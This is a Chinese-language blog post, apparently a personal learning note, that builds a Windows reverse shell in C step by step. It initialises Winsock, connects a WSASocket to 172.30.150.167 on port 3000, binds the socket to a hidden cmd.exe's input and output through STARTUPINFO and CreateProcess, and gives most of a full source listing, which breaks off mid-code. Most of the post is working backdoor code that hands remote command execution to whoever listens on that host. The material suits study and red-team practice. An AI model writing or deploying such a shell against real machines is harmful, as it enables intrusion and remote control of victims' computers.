<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="最近發現了一些有趣的專案來玩玩
主要是想 從0 從別人的教學文學習怎麼寫一個 windows reverse shell也方便給自己日後更改
首先參考 MSDN的網站所說，我們先創一個簡單的 init socket exameple code
123456789#include &amp;lt;winsock2.h&amp;gt;#include &amp;lt;ws2tcpip.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;#pragma comment(lib, &amp;quot;Ws2_32.lib&amp;quot;)int main() &amp;#123;  return 0;&amp;#125;

initial win socketMSDN
123456789101112131415161718192021222324252627282930313233343536#include &amp;lt;winsock2.h&amp;gt;#include &amp;lt;ws2tcpip.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;#pragma comment(lib, &amp;quot;Ws2_32.lib&amp;quot;)int main() &amp;#123;	int iResult;	WSADATA wsaData;	WORD wVersionRequested;	int err;	SOCKET wsocket;	// Initialize Winsock	iResult = WSAStartup(MAKEWORD(2, 2), &amp;amp;wsaData);	if (iResult != 0) &amp;#123;		printf(&amp;quot;WSAStartup failed: %d\n&amp;quot;, iResult);		return 1;	&amp;#125;	/* Use the MAKEWORD(lowbyte, highbyte) macro declared in Windef.h */	wVersionRequested = MAKEWORD(2, 2);	err = WSAStartup(wVersionRequested, &amp;amp;wsaData);	if (err != 0) &amp;#123;		/* Tell the user that we could not find a usable */		/* Winsock DLL.                                  */		printf(&amp;quot;WSAStartup failed with error: %d\n&amp;quot;, err);		return 1;	&amp;#125;	# create wsa socket		return 0;&amp;#125;

設定一個連線並建立一個連線MSDN
12345678910111213141516171819202122232425262728// Create a SOCKET for connecting to server   SOCKET ConnectSocket;   ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);   if (ConnectSocket == INVALID_SOCKET) &amp;#123;       wprintf(L&amp;quot;socket function failed with error: %ld\n&amp;quot;, WSAGetLastError());       WSACleanup();       return 1;   &amp;#125;//----------------------// The sockaddr_in structure specifies the address family,// IP address, and port of the server to be connected to.sockaddr_in clientService;clientService.sin_family = AF_INET;inet_pton(clientService.sin_family, &amp;quot;127.0.0.1&amp;quot;, &amp;amp;clientService.sin_addr);clientService.sin_port = htons(3000);//----------------------// Connect to server.iResult = connect(ConnectSocket, (SOCKADDR*)&amp;amp;clientService, sizeof(clientService));if (iResult == SOCKET_ERROR) &amp;#123;	wprintf(L&amp;quot;connect function failed with error: %ld\n&amp;quot;, WSAGetLastError());	iResult = closesocket(ConnectSocket);	if (iResult == SOCKET_ERROR)		wprintf(L&amp;quot;closesocket function failed with error: %ld\n&amp;quot;, WSAGetLastError());	WSACleanup();	return 1;&amp;#125;wprintf(L&amp;quot;Connected to server.\n&amp;quot;);
原本官方的 example 是用 clientService.sin_addr.s_addr = inet_addr(&amp;quot;127.0.0.1&amp;quot;);，但在我新版的 VS 上面跑會出現錯誤 (error C4996)，經過搜尋後得知 inet_addr 算是一個過舊的用法，網路上有提供數種解決方法，包括在 stdafx.h 加上 #define _WINSOCK_DEPRECATED_NO_WARNINGS 0 用以關閉錯誤訊息，這邊我選擇用 VS 推薦的用法，也就是以 inet_pton 取代 inet_addr


相關來源:https://stackoverflow.com/questions/5328070/how-to-convert-string-to-ip-address-and-vice-versahttps://blog.csdn.net/alzzw/article/details/99706060
到這邊就可以做連線測試了
到了這邊，基本上應該可以開始著手 reverse shell 的構建了然而，又被我找到這篇why-is-wsaconnect-working-and-connect-not從上文可以得知 socket 無法用於建立 reverse shell，因此是必須把 socket 更改成 WSASocket，然後想著既然都改了 socket，那是不是連 connect 都改成對應的 WSAConnect 比較保險What is the difference between connect() and WSAConnect() ?
其實根據上面的文章看起來用 connect 也可以，而事後證明也確實如此12345678910111213141516171819202122232425262728293031// Create a SOCKET for connecting to server	SOCKET ConnectSocket;	ConnectSocket = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);	if (ConnectSocket == INVALID_SOCKET) &amp;#123;		wprintf(L&amp;quot;socket function failed with error: %ld\n&amp;quot;, WSAGetLastError());		WSACleanup();		return 1;	&amp;#125;	//----------------------	// The sockaddr_in structure specifies the address family,	// IP address, and port of the server to be connected to.	sockaddr_in clientService;	clientService.sin_family = AF_INET;	inet_pton(clientService.sin_family, &amp;quot;172.30.150.167&amp;quot;, &amp;amp;clientService.sin_addr);	clientService.sin_port = htons(3000);	//----------------------	// Connect to server.		wsocket = connect(ConnectSocket, (SOCKADDR*)&amp;amp;clientService, sizeof(clientService));	if (wsocket == SOCKET_ERROR) &amp;#123;		wprintf(L&amp;quot;connect function failed with error: %ld\n&amp;quot;, WSAGetLastError());		wsocket = closesocket(ConnectSocket);		if (wsocket == SOCKET_ERROR)			wprintf(L&amp;quot;closesocket function failed with error: %ld\n&amp;quot;, WSAGetLastError());		WSACleanup();		return 1;	&amp;#125;	// For WSAConnect use	//WSAConnect(ConnectSocket, (SOCKADDR*)&amp;amp;clientService, sizeof(clientService), NULL, NULL, NULL, NULL);">
    

    <!--Author-->
    
        <meta name="author" content="AStar">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="windows-reverse-shell-note"/>
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="AStar&#39;s Blog"/>

    <!--Type page-->
    
        <meta property="og:type" content="article" />
    

    <!--Page Cover-->
    

        <meta name="twitter:card" content="summary" />
    

    <!-- Title -->
    
    <title>windows-reverse-shell-note - AStar&#39;s Blog</title>

    <!-- Bootstrap Core CSS -->
    <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet"/>

    <!-- Custom CSS -->
    
<link rel="stylesheet" href="/css/style.css">


    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
    <link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css">
    <link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
    <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />

    <!-- Google Analytics -->
    


    <!-- favicon -->
    
	
<meta name="generator" content="Hexo 5.4.0"></head>


<body>

    <!-- Menu -->
    <!-- Navigation -->
<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
    <div class="container-fluid">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header page-scroll">
            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="/">AStar</a>
        </div>

        <!-- Collect the nav links, forms, and other content for toggling -->
        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
            <ul class="nav navbar-nav navbar-right">
                
                    <li>
                        <a href="/">
                            
                                Home
                            
                        </a>
                    </li>
                
                    <li>
                        <a href="/archives">
                            
                                Archives
                            
                        </a>
                    </li>
                
                    <li>
                        <a href="/tags">
                            
                                Tags
                            
                        </a>
                    </li>
                
                    <li>
                        <a href="/categories">
                            
                                Categories
                            
                        </a>
                    </li>
                
                    <li>
                        <a target="_blank" rel="noopener" href="https://github.com/klugjo/hexo-theme-clean-blog">
                            
                                <i class="fa fa-github fa-stack-2x"></i>
                            
                        </a>
                    </li>
                
            </ul>
        </div>
        <!-- /.navbar-collapse -->
    </div>
    <!-- /.container -->
</nav>

    <!-- Main Content -->
    <!-- Page Header -->
<!-- Set your background image for this header in your post front-matter: cover -->

<header class="intro-header" style="background-image: url('https://i.imgur.com/mUijvOa.jpg')">
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <div class="post-heading">
                    <h1>windows-reverse-shell-note</h1>
                    
                    <span class="meta">
                        <!-- Date and Author -->
                        
                        
                            2022-08-15
                        
                    </span>
                </div>
            </div>
        </div>
    </div>
</header>

<!-- Post Content -->
<article>
    <div class="container">
        <div class="row">

            <!-- Tags and categories -->
           

            <!-- Gallery -->
            

            <!-- Post Main Content -->
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <p>最近發現了一些有趣的專案來玩玩</p>
<p>主要是想 <del>從0</del> 從別人的教學文學習怎麼寫一個 windows reverse shell<br>也方便給自己日後更改</p>
<p>首先參考 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/winsock/creating-a-basic-winsock-application">MSDN</a>的網站所說，我們先創一個簡單的 init socket exameple code</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ws2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;Ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>initial win socket<br><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-tw/windows/win32/winsock/initializing-winsock">MSDN</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ws2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;Ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> iResult;</span><br><span class="line">	WSADATA wsaData;</span><br><span class="line">	WORD wVersionRequested;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line">	SOCKET wsocket;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Initialize Winsock</span></span><br><span class="line">	iResult = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">	<span class="keyword">if</span> (iResult != <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed: %d\n&quot;</span>, iResult);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* Use the MAKEWORD(lowbyte, highbyte) macro declared in Windef.h */</span></span><br><span class="line">	wVersionRequested = MAKEWORD(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	err = WSAStartup(wVersionRequested, &amp;wsaData);</span><br><span class="line">	<span class="keyword">if</span> (err != <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="comment">/* Tell the user that we could not find a usable */</span></span><br><span class="line">		<span class="comment">/* Winsock DLL.                                  */</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed with error: %d\n&quot;</span>, err);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta"># create wsa socket</span></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>設定一個連線並建立一個連線<br><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-connect">MSDN</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Create a SOCKET for connecting to server</span></span><br><span class="line">   SOCKET ConnectSocket;</span><br><span class="line">   ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">   <span class="keyword">if</span> (ConnectSocket == INVALID_SOCKET) &#123;</span><br><span class="line">       wprintf(<span class="string">L&quot;socket function failed with error: %ld\n&quot;</span>, WSAGetLastError());</span><br><span class="line">       WSACleanup();</span><br><span class="line">       <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">//----------------------</span></span><br><span class="line"><span class="comment">// The sockaddr_in structure specifies the address family,</span></span><br><span class="line"><span class="comment">// IP address, and port of the server to be connected to.</span></span><br><span class="line">sockaddr_in clientService;</span><br><span class="line">clientService.sin_family = AF_INET;</span><br><span class="line">inet_pton(clientService.sin_family, <span class="string">&quot;127.0.0.1&quot;</span>, &amp;clientService.sin_addr);</span><br><span class="line">clientService.sin_port = htons(<span class="number">3000</span>);</span><br><span class="line"><span class="comment">//----------------------</span></span><br><span class="line"><span class="comment">// Connect to server.</span></span><br><span class="line">iResult = connect(ConnectSocket, (SOCKADDR*)&amp;clientService, <span class="keyword">sizeof</span>(clientService));</span><br><span class="line"><span class="keyword">if</span> (iResult == SOCKET_ERROR) &#123;</span><br><span class="line">	wprintf(<span class="string">L&quot;connect function failed with error: %ld\n&quot;</span>, WSAGetLastError());</span><br><span class="line">	iResult = closesocket(ConnectSocket);</span><br><span class="line">	<span class="keyword">if</span> (iResult == SOCKET_ERROR)</span><br><span class="line">		wprintf(<span class="string">L&quot;closesocket function failed with error: %ld\n&quot;</span>, WSAGetLastError());</span><br><span class="line">	WSACleanup();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wprintf(<span class="string">L&quot;Connected to server.\n&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>原本官方的 example 是用 <code>clientService.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;);</code>，但在我新版的 VS 上面跑會出現錯誤 (error C4996)，經過搜尋後得知 <code>inet_addr</code> 算是一個過舊的用法，網路上有提供數種解決方法，包括在 <code>stdafx.h</code> 加上 <code>#define _WINSOCK_DEPRECATED_NO_WARNINGS 0</code> 用以關閉錯誤訊息，這邊我選擇用 VS 推薦的用法，也就是以 <code>inet_pton</code> 取代 <code>inet_addr</code></p>
</li>
</ul>
<p>相關來源:<br><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/5328070/how-to-convert-string-to-ip-address-and-vice-versa">https://stackoverflow.com/questions/5328070/how-to-convert-string-to-ip-address-and-vice-versa</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/alzzw/article/details/99706060">https://blog.csdn.net/alzzw/article/details/99706060</a></p>
<p>到這邊就可以做連線測試了</p>
<p>到了這邊，基本上應該可以開始著手 reverse shell 的構建了<br>然而，又被我找到這篇<br><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/58269068/why-is-wsaconnect-working-and-connect-not">why-is-wsaconnect-working-and-connect-not</a><br>從上文可以得知 <code>socket</code> 無法用於建立 reverse shell，因此是必須把 <code>socket</code> 更改成 <code>WSASocket</code>，然後想著既然都改了 socket，那是不是連 <code>connect</code> 都改成對應的 <code>WSAConnect</code> 比較保險<br><a target="_blank" rel="noopener" href="https://groups.google.com/g/alt.winsock.programming/c/wenhXY5iIZM">What is the difference between connect() and WSAConnect() ?</a></p>
<p><code>其實根據上面的文章看起來用 connect 也可以，而事後證明也確實如此</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Create a SOCKET for connecting to server</span></span><br><span class="line">	SOCKET ConnectSocket;</span><br><span class="line">	ConnectSocket = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (ConnectSocket == INVALID_SOCKET) &#123;</span><br><span class="line">		wprintf(<span class="string">L&quot;socket function failed with error: %ld\n&quot;</span>, WSAGetLastError());</span><br><span class="line">		WSACleanup();</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//----------------------</span></span><br><span class="line">	<span class="comment">// The sockaddr_in structure specifies the address family,</span></span><br><span class="line">	<span class="comment">// IP address, and port of the server to be connected to.</span></span><br><span class="line">	sockaddr_in clientService;</span><br><span class="line">	clientService.sin_family = AF_INET;</span><br><span class="line">	inet_pton(clientService.sin_family, <span class="string">&quot;172.30.150.167&quot;</span>, &amp;clientService.sin_addr);</span><br><span class="line">	clientService.sin_port = htons(<span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//----------------------</span></span><br><span class="line">	<span class="comment">// Connect to server.</span></span><br><span class="line">	</span><br><span class="line">	wsocket = connect(ConnectSocket, (SOCKADDR*)&amp;clientService, <span class="keyword">sizeof</span>(clientService));</span><br><span class="line">	<span class="keyword">if</span> (wsocket == SOCKET_ERROR) &#123;</span><br><span class="line">		wprintf(<span class="string">L&quot;connect function failed with error: %ld\n&quot;</span>, WSAGetLastError());</span><br><span class="line">		wsocket = closesocket(ConnectSocket);</span><br><span class="line">		<span class="keyword">if</span> (wsocket == SOCKET_ERROR)</span><br><span class="line">			wprintf(<span class="string">L&quot;closesocket function failed with error: %ld\n&quot;</span>, WSAGetLastError());</span><br><span class="line">		WSACleanup();</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// For WSAConnect use</span></span><br><span class="line">	<span class="comment">//WSAConnect(ConnectSocket, (SOCKADDR*)&amp;clientService, sizeof(clientService), NULL, NULL, NULL, NULL);</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<ul>
<li>CreateProcess</li>
</ul>
<p>首先定義一個 <code>STARTUPINFO</code> 型別的架構用給 <code>CreateProcess</code> 用的<br><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa">MSDN</a></p>
<p>然後記得 <code>dwFlags</code> 一定要設定成 <code>STARTF_USESTDHANDLES</code> 不然 Stream IO 會跑到 spawn 程式的 cmd<br><img src="/img/2022/windows-reverse-shell-note/windows-reverse-shell-note_1.png" alt=""><br>把 <code>STARTF_USESTDHANDLES</code> 設好後就可以指定 process 的 IO handler<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">STARTUPINFO si;</span><br><span class="line"><span class="built_in">memset</span>(&amp;si, <span class="number">0</span>, <span class="keyword">sizeof</span>(si));</span><br><span class="line">si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line">si.dwFlags = STARTF_USESTDHANDLES|SW_HIDE;</span><br><span class="line">si.hStdInput = (HANDLE)ConnectSocket;</span><br><span class="line">si.hStdOutput = (HANDLE)ConnectSocket;</span><br><span class="line">si.hStdError = (HANDLE)ConnectSocket;</span><br></pre></td></tr></table></figure></p>
<p>最後就是 CreateProcess</p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-tw/windows/win32/procthread/creating-processes">MSDN</a><br>注意這邊第二個參數不能直接給字串，照著 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa">MSDN</a> 上的說明他是吃 <code>LPSTR</code> 的型別<br>所以找了下 <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/14682480/converting-from-const-char-to-lptstr-without-uses-converstion">stackoverflow</a> 得到的解法<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> cmd[] = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">LPSTR cmdline = <span class="keyword">const_cast</span>&lt;LPSTR&gt;(cmd);</span><br></pre></td></tr></table></figure><br>除此之外還要多設定 <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/21834833/argument-of-type-const-char-is-incompatible-with-parameter-of-type-lpcwstr">Multi-Byte Character Set</a><br><img src="/img/2022/windows-reverse-shell-note/windows-reverse-shell-note_10.png" alt=""></p>
<p>然後 CreateProcess 的第 5 個參數要設成 <code>TRUE</code>，也就是 <code>Set handle inheritance to TRUE</code>，不然一樣會失敗<br><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/2040768/what-does-it-mean-a-child-process-can-inherit-the-handle">https://stackoverflow.com/questions/2040768/what-does-it-mean-a-child-process-can-inherit-the-handle</a></p>
<p>最後還要定義一個 <code>PROCESS_INFORMATION</code> 來定義整個 process information<br>source code 放在下面</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ws2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Ws2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;Ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	WSADATA wsaData;</span><br><span class="line">	WORD wVersionRequested;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line">	SOCKET wsocket;</span><br><span class="line">	STARTUPINFO si;</span><br><span class="line">	PROCESS_INFORMATION pi;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Initialize Winsock</span></span><br><span class="line">	iResult = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">	<span class="keyword">if</span> (iResult != <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed: %d\n&quot;</span>, iResult);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* Use the MAKEWORD(lowbyte, highbyte) macro declared in Windef.h */</span></span><br><span class="line">	wVersionRequested = MAKEWORD(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	err = WSAStartup(wVersionRequested, &amp;wsaData);</span><br><span class="line">	<span class="keyword">if</span> (err != <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="comment">/* Tell the user that we could not find a usable */</span></span><br><span class="line">		<span class="comment">/* Winsock DLL.                                  */</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed with error: %d\n&quot;</span>, err);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Create a SOCKET for connecting to server</span></span><br><span class="line">	SOCKET ConnectSocket;</span><br><span class="line">	ConnectSocket = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (ConnectSocket == INVALID_SOCKET) &#123;</span><br><span class="line">		wprintf(<span class="string">L&quot;socket function failed with error: %ld\n&quot;</span>, WSAGetLastError());</span><br><span class="line">		WSACleanup();</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//----------------------</span></span><br><span class="line">	<span class="comment">// The sockaddr_in structure specifies the address family,</span></span><br><span class="line">	<span class="comment">// IP address, and port of the server to be connected to.</span></span><br><span class="line">	sockaddr_in clientService;</span><br><span class="line">	clientService.sin_family = AF_INET;</span><br><span class="line">	inet_pton(clientService.sin_family, <span class="string">&quot;172.30.150.167&quot;</span>, &amp;clientService.sin_addr);</span><br><span class="line">	clientService.sin_port = htons(<span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//----------------------</span></span><br><span class="line">	<span class="comment">// Connect to 